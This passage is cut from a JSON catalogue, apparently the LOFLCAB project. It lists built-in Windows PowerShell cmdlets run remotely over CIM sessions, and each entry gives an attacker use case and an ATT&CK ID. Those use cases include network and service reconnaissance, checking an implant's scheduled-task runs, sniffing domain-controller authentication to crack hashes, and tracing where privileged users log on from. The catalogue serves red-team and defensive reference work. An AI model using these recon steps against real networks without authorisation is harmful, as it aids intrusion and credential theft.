"Type":"Cmdlets","Name":"Get-MpThreat","Description":"Gets the history of threats detected on the computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-MpThreat -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-MpThreat/"},{
"Type":"Cmdlets","Name":"Get-MpThreatCatalog","Description":"Gets known threats from the definitions catalog","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-MpThreatCatalog -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-MpThreatCatalog/"},{
"Type":"Cmdlets","Name":"Get-MpThreatDetection","Description":"Gets active and past malware threats that Windows Defender detected","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-MpThreatDetection -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Defender`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-MpThreatDetection/"},{
"Type":"Cmdlets","Name":"Get-NetAdapter","Description":"Gets the basic network adapter properties","Updated":"2024-12-13","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetAdapter -Name * -CimSession $s","Description":"List adapters","Usecases":["Identify whether a machine is dual-homed"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetAdapter`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetAdapter/"},{
"Type":"Cmdlets","Name":"Get-NetConnectionProfile","Description":"Gets a connection profile","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetConnectionProfile -CimSession $s","Description":"List active connection profiles","Usecases":["Determine what connection profiles are active on the network interfaces"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetConnection`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetConnectionProfile/"},{
"Type":"Cmdlets","Name":"Get-NetEventSession","Description":"Gets network event sessions","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetEventSession -Name sess -CimSession $s","Description":"Get status of an event session","Usecases":["Sniff authentication traffic on a domain controller and locally crack the hashes"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","See all details in [New-NetEventSession](../New-NetEventSession)","PowerShell Module: `NetEventPacketCapture`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetEventSession/"},{
"Type":"Cmdlets","Name":"Get-NetFirewallRule","Description":"Retrieves firewall rules from the target computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetFirewallRule -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `netsecurity`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetFirewallRule/"},{
"Type":"Cmdlets","Name":"Get-NetIPAddress","Description":"Gets the IP address configuration","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetIPAddress -CimSession $s | Sort InterfaceIndex | ft -Autosize InterfaceIndex, InterfaceAlias, AddressFamily, IPAddress, PrefixLength","Description":"List IP addresses of the various interfaces","Usecases":["Identify whether a machine might be dual-homed"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetIPAddress/"},{
"Type":"Cmdlets","Name":"Get-NetIPInterface","Description":"Gets an IP interface","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetIPInterface -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetIPInterface/"},{
"Type":"Cmdlets","Name":"Get-NetNat","Description":"Gets NAT objects","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetNat -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetNat/"},{
"Type":"Cmdlets","Name":"Get-NetNatExternalAddress","Description":"Gets external addresses configured for NAT instances","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetNatExternalAddress -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetNatExternalAddress/"},{
"Type":"Cmdlets","Name":"Get-NetNatGlobal","Description":"Retrieves global settings for all NAT instances on a computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetNatGlobal -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetNatGlobal/"},{
"Type":"Cmdlets","Name":"Get-NetNatSession","Description":"Gets all active NAT sessions","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetNatSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetNatSession/"},{
"Type":"Cmdlets","Name":"Get-NetNatStaticMapping","Description":"Gets static mappings configured on NAT instances","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-NetNatStaticMapping -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetNat`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetNatStaticMapping/"},{
"Type":"Cmdlets","Name":"Get-NetNeighbor","Description":"Gets neighbor cache entries","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetNeighbor -CimSession $s | select InterfaceIndex,IPAddress,AddressFamily,LinkLayerAddress,State,InterfaceAlias | ft","Description":"List ARP entries","Usecases":["Identify which devices are in the same subnet"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetNeighbor/"},{
"Type":"Cmdlets","Name":"Get-NetRoute","Description":"Gets the IP route information from the IP routing table","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetRoute -CimSession $s","Description":"List routing table","Usecases":["Identify network routes"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetRoute/"},{
"Type":"Cmdlets","Name":"Get-NetTCPConnection","Description":"Gets TCP connections","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetTCPConnection -CimSession $s -State Listen","Description":"Enumerate listening TCP ports","Usecases":["Recon on listening services"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]},{"Command":"Get-NetTCPConnection -CimSession $s -State Established","Description":"List established connections","Usecases":["Recon on current network and Internet activity"],"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetTCPConnection/"},{
"Type":"Cmdlets","Name":"Get-NetUDPEndpoint","Description":"Gets current UDP endpoint statistics","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-NetUDPEndpoint -CimSession $s","Description":"Enumerate listening UDP ports","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `NetTCPIP`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NetUDPEndpoint/"},{
"Type":"Cmdlets","Name":"Get-NfsSession","Description":"Gets information about which client computers are currently connected to one or more shares on an NFS server","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-NfsSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: NFS"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NfsSession/"},{
"Type":"Cmdlets","Name":"Get-NfsShare","Description":"Gets NFS shares on an NFS server","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-NfsShare -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: NFS"],"MitreAttack":["T1135","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-NfsShare/"},{
"Type":"Cmdlets","Name":"Get-OdbcDsn","Description":"Gets ODBC DSNs","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-OdbcDsn -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: Wdac"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-OdbcDsn/"},{
"Type":"Cmdlets","Name":"Get-Partition","Description":"Returns a list of all partition objects visible on all disks, or optionally a filtered list using specified parameters","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-Partition -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-Partition/"},{
"Type":"Cmdlets","Name":"Get-PhysicalDisk","Description":"Gets a list of all PhysicalDisk objects visible across any available Storage Management Providers, or optionally a filtered list","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-PhysicalDisk -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-PhysicalDisk/"},{
"Type":"Cmdlets","Name":"Get-Printer","Description":"Retrieves a list of printers installed on a computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-Printer -CimSession $s","Description":"TODO","Usecases":null,"Function":"Misc","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: PrintManagement"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-Printer/"},{
"Type":"Cmdlets","Name":"Get-Process","Description":"Gets the processes that are running on the local computer or a remote computer.","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"Get-Process -ComputerName DC1.ad.bitsadmin.com","Description":"List processes","Usecases":["Reconnaissance on running processes"],"Function":"Processes","Comments":null,"MitreAttack":["T1057"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-Process/"},{
"Type":"Cmdlets","Name":"Get-RemoteAccess","Description":"Displays the configuration of DirectAccess (DA) and VPN (both Remote Access VPN and site-to-site VPN)","Updated":"2023-07-01","Toolsets":["CIMSession","TODO"],"Commands":[{"Command":"Get-RemoteAccess -CimSession $s","Description":"TODO","Usecases":null,"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: RemoteAccess"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-RemoteAccess/"},{
"Type":"Cmdlets","Name":"Get-ScheduledTask","Description":"Gets the task definition object of a scheduled task that is registered on the local computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-ScheduledTask -CimSession $s | % { [PSCustomObject]@{State=$_.State; TaskName=$_.TaskName; TaskPath=$_.TaskPath; Actions=$($a=$_.Actions;$($a.Id,$a.WorkingDirectory,$a.Execute,$a.Arguments).Where({$_ -ne $null}) -join \" \"); Author=$_.Author; Description=$_.Description; SecurityDescriptor=$_.SecurityDescriptor } }","Description":"List details on scheduled tasks","Usecases":["Reconnaissance"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1053.005","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ScheduledTask/"},{
"Type":"Cmdlets","Name":"Get-ScheduledTaskInfo","Description":"Gets run-time information for a scheduled task","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-ScheduledTaskInfo -CimSession $s -TaskName '\\Microsoft\\Windows\\DiskCleanup\\CleanupBackdoor'","Description":"List details on scheduled task execution","Usecases":["Determine past executions of implant"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `ScheduledTasks`"],"MitreAttack":["T1053.005","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-ScheduledTaskInfo/"},{
"Type":"Cmdlets","Name":"Get-Service","Description":"Gets the services on a local or remote computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-Service -ComputerName W10.ad.bitsadmin.com","Description":"List services","Usecases":["Reconnaissance on installed services"],"Function":"Processes","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-Service/"},{
"Type":"Cmdlets","Name":"Get-SmbConnection","Description":"Retrieves the connections established from the SMB client to the SMB servers","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-SmbConnection -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-SmbConnection/"},{
"Type":"Cmdlets","Name":"Get-SmbOpenFile","Description":"Retrieves basic information about the files that are open on behalf of the clients of the SMB server","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-SmbOpenFile -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-SmbOpenFile/"},{
"Type":"Cmdlets","Name":"Get-SmbServerConfiguration","Description":"Retrieves the SMB server configuration","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-SmbServerConfiguration -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-SmbServerConfiguration/"},{
"Type":"Cmdlets","Name":"Get-SmbSession","Description":"Retrieves information about the SMB sessions that are currently established between the SMB server and the associated clients","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-SmbSession -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-SmbSession/"},{
"Type":"Cmdlets","Name":"Get-SmbShare","Description":"Retrieves the SMB shares on the computer","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-SmbShare -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `SmbShare`"],"MitreAttack":["T1135","T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-SmbShare/"},{
"Type":"Cmdlets","Name":"Get-VM","Description":"Gets the virtual machines from one or more Hyper-V hosts","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession"],"Commands":[{"Command":"Get-VM -CimSession $s","Description":"List VMs","Usecases":["Reconnaissance on VMs running on a Hyper-V server"],"Function":"Manage","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Hyper-V`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-VM/"},{
"Type":"Cmdlets","Name":"Get-VirtualDisk","Description":"Returns a list of VirtualDisk objects, across all storage pools, across all providers, or optionally a filtered subset based on provided criteria","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-VirtualDisk -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-VirtualDisk/"},{
"Type":"Cmdlets","Name":"Get-Volume","Description":"Gets the specified Volume object, or all Volume objects if no filter is provided","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-Volume -CimSession $s","Description":"TODO","Usecases":null,"Function":"Data","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: `Storage`"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-Volume/"},{
"Type":"Cmdlets","Name":"Get-VpnConnection","Description":"Retrieves the specified VPN connection profile information","Updated":"2023-07-01","Toolsets":["Builtin","CIMSession","TODO"],"Commands":[{"Command":"Get-VpnConnection -CimSession $s","Description":"TODO","Usecases":null,"Function":"Network","Comments":["Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","PowerShell Module: VpnClient"],"MitreAttack":["T1047"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-VpnConnection/"},{
"Type":"Cmdlets","Name":"Get-WSManInstance","Description":"Displays management information for a resource instance specified by a Resource URI","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"Get-WSManInstance -ConnectionURI http://W10.ad.bitsadmin.com:5985/wsman shell -Enumerate","Description":"List WSMan connections","Usecases":["Identify which WSMan sessions are currently active and from where"],"Function":"Sessions","Comments":["PowerShell Module: `Microsoft.WSMan.Management`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-WSManInstance/"},{
"Type":"Cmdlets","Name":"Get-WinEvent","Description":"Gets events from event logs and event tracing log files on local and remote computers","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @{logname=\"Security\";id=4768} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value} }","Description":"List all Kerberos authentication requests","Usecases":["Identify which IPs logons of privileged users are originating from"],"Function":"Logs","Comments":["PowerShell Module: `Microsoft.PowerShell.Diagnostics`"],"MitreAttack":null},{"Command":"Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -LogName 'Security' -FilterXPath \"*[System[(EventID=4768)]] and *[EventData[Data[@Name='TargetUserName']='SomeAdmin']]\"","Description":"Based on TGT request identify from which IP a user is authenticating","Usecases":["Identify which IP a privileged user is originating from"],"Function":"Logs","Comments":["PowerShell Module: `Microsoft.PowerShell.Diagnostics`"],"MitreAttack":null},{"Command":"Get-WinEvent -ComputerName W10.ad.bitsadmin.com -FilterHashtable @{logname=\"Security\";id=4624} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; SubjectUserSid=$_.Properties[0].Value; SubjectUserName=$_.Properties[1].Value; SubjectDomainName=$_.Properties[2].Value; SubjectLogonId=$_.Properties[3].Value; TargetUserSid=$_.Properties[4].Value; TargetUserName=$_.Properties[5].Value; TargetDomainName=$_.Properties[6].Value; TargetLogonId=$_.Properties[7].Value; LogonType=$_.Properties[8].Value; LogonProcessName=$_.Properties[9].Value; AuthenticationPackageName=$_.Properties[10].Value; WorkstationName=$_.Properties[11].Value; LogonGuid=$_.Properties[12].Value; TransmittedServices=$_.Properties[13].Value; LmPackageName=$_.Properties[14].Value; KeyLength=$_.Properties[15].Value; ProcessId=$_.Properties[16].Value; ProcessName=$_.Properties[17].Value; IpAddress=$_.Properties[18].Value; IpPort=$_.Properties[19].Value; ImpersonationLevel=$_.Properties[20].Value; RestrictedAdminMode=$_.Properties[21].Value; TargetOutboundUserName=$_.Properties[22].Value; TargetOutboundDomainName=$_.Properties[23].Value; VirtualAccount=$_.Properties[24].Value; TargetLinkedLogonId=$_.Properties[25].Value; ElevatedToken=$_.Properties[26].Value;} }","Description":"List logons on a system","Usecases":["Understand which accounts are used on a system"],"Function":"Logs","Comments":["PowerShell Module: `Microsoft.PowerShell.Diagnostics`"],"MitreAttack":null},{"Command":"Get-WinEvent -ListLog * -ComputerName DC1.ad.bitsadmin.com","Description":"Check which logs are enabled by viewing the number of records per log","Usecases":null,"Function":"Logs","Comments":["PowerShell Module: `Microsoft.PowerShell.Diagnostics`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-WinEvent/"},{
"Type":"Cmdlets","Name":"Get-WindowsFeature","Description":"Gets information about Windows Server roles, role services, and features that are available for installation and installed on a specified server","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Get-WindowsFeature","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `ServerManager`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Get-WindowsFeature/"},{
"Type":"Cmdlets","Name":"Install-WindowsFeature","Description":"Installs one or more roles, role services, or features on either the local or a specified remote server that is running Windows Server 2012 R2","Updated":"2023-07-01","Toolsets":["RSAT","TODO"],"Commands":[{"Command":"Install-WindowsFeature","Description":"TODO","Usecases":null,"Function":"Manage","Comments":["PowerShell Module: `ServerManager`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Cmdlets/Install-WindowsFeature/"},{
